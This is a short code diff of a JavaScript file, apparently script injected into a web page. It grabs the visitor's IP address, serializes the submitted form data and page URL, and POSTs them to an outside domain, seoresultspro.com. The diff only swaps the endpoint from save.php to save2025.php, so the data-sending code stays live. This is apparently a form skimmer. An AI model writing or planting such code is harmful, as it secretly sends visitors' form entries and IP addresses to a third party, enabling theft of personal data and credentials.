@@ -30,7 +30,7 @@ $.getJSON("https://api.ipify.org?format=json", function (t) {
                             console.log(t);
                             let e = { pageURL: window.location.href, ip: t.ip, form: $(this).serialize() };
                             $.ajax({
-                                url: "https://seoresultspro.com/save.php",
+                                url: "https://seoresultspro.com/save2025.php",
                                 type: "POST",
                                 data: e,
                                 beforeSend() {
